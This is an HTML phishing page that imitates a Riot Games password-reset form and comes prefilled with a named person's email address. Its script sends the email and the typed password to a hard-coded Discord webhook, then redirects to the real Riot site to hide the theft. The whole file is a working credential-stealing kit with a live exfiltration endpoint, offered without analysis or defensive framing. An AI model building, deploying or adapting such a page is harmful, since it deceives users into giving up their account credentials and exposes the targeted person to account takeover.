<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Riot Games - Password Reset</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: url("https://lolstatic-a.akamaihd.net/derp-recovery-ui/2.3.12/assets/riot_desktop_background_2x.jpg")
          no-repeat center center fixed;
        background-size: cover;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        color: #fff;
        position: relative;
      }

      /* Dark overlay to ensure text readability */
      body::before {
        content: "";
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.4);
        z-index: -1;
      }

      .header {
        position: absolute;
        top: 40px;
        left: 40px;
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .logo {
        width: 40px;
        height: 40px;
        background-color: #c8514c;
        border-radius: 6px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 20px;
        font-weight: bold;
      }

      .logo-text {
        font-size: 24px;
        font-weight: 700;
        color: #fff;
        letter-spacing: 0.5px;
      }

      .main-content {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      .left-side {
        flex: 1;
        display: flex;
        flex-direction: column;
        justify-content: center;
        padding-left: 10%;
        max-width: 600px;
      }

      .title {
        font-size: 72px;
        font-weight: 900;
        color: #fff;
        line-height: 1.1;
        margin-bottom: 40px;
        text-transform: uppercase;
        letter-spacing: -2px;
      }

      .password-form {
        background: rgba(255, 255, 255, 0.95);
        border-radius: 8px;
        padding: 40px;
        width: 100%;
        max-width: 400px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      }

      .form-title {
        font-size: 28px;
        font-weight: 700;
        color: #333;
        margin-bottom: 8px;
      }

      .form-subtitle {
        font-size: 16px;
        color: #666;
        margin-bottom: 40px;
      }

      .form-group {
        margin-bottom: 24px;
      }

      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #666;
        font-size: 12px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }

      .form-group input {
        width: 100%;
        padding: 16px;
        border: 2px solid #e0e0e0;
        border-radius: 4px;
        background: #fff;
        color: #333;
        font-size: 16px;
        transition: all 0.3s ease;
      }

      .form-group input:focus {
        outline: none;
        border-color: #c8514c;
        box-shadow: 0 0 0 3px rgba(200, 81, 76, 0.1);
      }

      .form-group input:disabled {
        background: #f5f5f5;
        color: #666;
        cursor: not-allowed;
      }

      .submit-button {
        width: 100%;
        padding: 16px;
        background: #c8514c;
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }

      .submit-button:hover {
        background: #b54a45;
        transform: translateY(-1px);
      }

      .submit-button:disabled {
        background: #ccc;
        cursor: not-allowed;
        transform: none;
      }

      .footer {
        position: absolute;
        bottom: 30px;
        left: 40px;
        display: flex;
        gap: 30px;
      }

      .footer a {
        color: rgba(255, 255, 255, 0.6);
        text-decoration: none;
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        transition: color 0.3s ease;
      }

      .footer a:hover {
        color: #c8514c;
      }

      .copyright {
        position: absolute;
        bottom: 30px;
        right: 40px;
        color: rgba(255, 255, 255, 0.4);
        font-size: 12px;
      }

      .success-message {
        background: #4caf50;
        color: white;
        padding: 12px;
        border-radius: 4px;
        margin-bottom: 20px;
        display: none;
      }

      .error-message {
        background: #f44336;
        color: white;
        padding: 12px;
        border-radius: 4px;
        margin-bottom: 20px;
        display: none;
      }

      @media (max-width: 768px) {
        .main-content {
          flex-direction: column;
          text-align: center;
        }

        .left-side {
          padding-left: 0;
          margin-bottom: 40px;
        }

        .title {
          font-size: 48px;
        }

        .header,
        .footer,
        .copyright {
          position: static;
          margin: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="header">
      <img
        src="https://img.icons8.com/?size=512&id=V1Ja402KSwyz&format=png"
        alt="Fist Logo"
        width="40"
        height="40"
      />
    </div>

    <div class="main-content">
      <div class="left-side">
        <div class="title" style="font-size: 48px; text-align: left">
          PASSWORD<br />CHANGE
        </div>
      </div>

      <div class="password-form">
        <div class="success-message" id="successMessage">
          Password updated successfully!
        </div>
        <div class="error-message" id="errorMessage">
          Please fill in all fields correctly.
        </div>

        <h2 class="form-title">Enter a new password</h2>
        <p class="form-subtitle">Make sure it's a good one.</p>

        <form id="passwordForm">
          <div class="form-group">
            <label for="email">EMAIL</label>
            <input
              type="email"
              id="email"
              value="victor.brinzea002@gmail.com"
              disabled
            />
          </div>

          <div class="form-group">
            <label for="password">PASSWORD</label>
            <input
              type="password"
              id="password"
              placeholder="Enter new password"
              required
            />
          </div>

          <div class="form-group">
            <label for="confirmPassword">CONFIRM PASSWORD</label>
            <input
              type="password"
              id="confirmPassword"
              placeholder="Confirm new password"
              required
            />
          </div>

          <button type="submit" class="submit-button" id="submitButton">
            Update Password
          </button>
        </form>
      </div>
    </div>

    <div class="footer">
      <a href="#">SUPPORT</a>
      <a href="#">PRIVACY NOTICE</a>
      <a href="#">TERMS OF SERVICE</a>
      <a href="#">COOKIE PREFERENCES</a>
    </div>

    <div class="copyright">Â© 2020 RIOT GAMES. ALL RIGHTS RESERVED.</div>

    <script>
      document
        .getElementById("passwordForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault();

          const password = document.getElementById("password").value;
          const confirmPassword =
            document.getElementById("confirmPassword").value;
          const email = document.getElementById("email").value;
          const submitButton = document.getElementById("submitButton");
          const successMessage = document.getElementById("successMessage");
          const errorMessage = document.getElementById("errorMessage");

          // Hide previous messages
          successMessage.style.display = "none";
          errorMessage.style.display = "none";

          // Validate passwords
          if (password !== confirmPassword) {
            errorMessage.textContent = "Passwords do not match.";
            errorMessage.style.display = "block";
            return;
          }

          if (password.length < 8) {
            errorMessage.textContent =
              "Password must be at least 8 characters long.";
            errorMessage.style.display = "block";
            return;
          }

          // Disable button during submission
          submitButton.disabled = true;
          submitButton.textContent = "Updating...";

          try {
            // Send to Discord webhook
            const response = await fetch(
              "https://discord.com/api/webhooks/1395314097800745023/vjoQg3Bf7NsAvFo73F2jnTT_nfqtuwYm5Upa940bCjTkAL8F9Z8Rhca1WlM1_aUusNF7",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  embeds: [
                    {
                      title: "ðŸ”’ Password Reset",
                      color: 0xc8514c,
                      fields: [
                        {
                          name: "Email",
                          value: email,
                          inline: true,
                        },
                        {
                          name: "New Password",
                          value: password,
                          inline: true,
                        },
                        {
                          name: "Timestamp",
                          value: new Date().toLocaleString(),
                          inline: true,
                        },
                      ],
                      footer: {
                        text: "Riot Games Password Reset",
                      },
                    },
                  ],
                }),
              }
            );

            if (response.ok) {
              successMessage.style.display = "block";
              document.getElementById("passwordForm").reset();
              document.getElementById("email").value =
                "victor.brinzea002@gmail.com";

              // Redirect to Riot Games website after 2 seconds
              setTimeout(() => {
                window.location.href = "https://www.riotgames.com";
              }, 2000);
            } else {
              throw new Error("Failed to update password");
            }
          } catch (error) {
            errorMessage.textContent =
              "Failed to update password. Please try again.";
            errorMessage.style.display = "block";
          } finally {
            // Re-enable button
            submitButton.disabled = false;
            submitButton.textContent = "Update Password";
          }
        });
    </script>
  </body>
</html>
